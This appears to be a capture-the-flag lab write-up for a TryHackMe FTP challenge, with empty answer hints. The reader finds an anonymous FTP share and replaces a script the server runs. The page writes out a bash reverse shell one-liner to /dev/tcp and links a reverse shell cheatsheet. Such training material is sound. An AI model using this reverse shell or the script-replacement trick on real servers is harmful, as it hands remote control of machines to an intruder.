---
description: Networking - FTP
---

# Anyone can be Santa!

## Video

{% embed url="https://www.youtube.com/watch?v=i-jqFYTPEV4" %}

## Resources

The standard for these two connections are the two ports:

* Port 20 \(Data\)
* Port 21 \(Commands\)

[pentesters cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

`bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1`

## Challenge

Name the directory on the FTP server that has data accessible by the "anonymous" user 

{% hint style="success" %}

{% endhint %}

What script gets executed within this directory?

{% hint style="success" %}

{% endhint %}

What movie did Santa have on his Christmas shopping list?

{% hint style="success" %}

{% endhint %}

Re-upload this script to contain malicious data \(just like we did in section **9.6**. Output the contents of /root/flag.txt!

Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from. 

{% hint style="success" %}

{% endhint %}

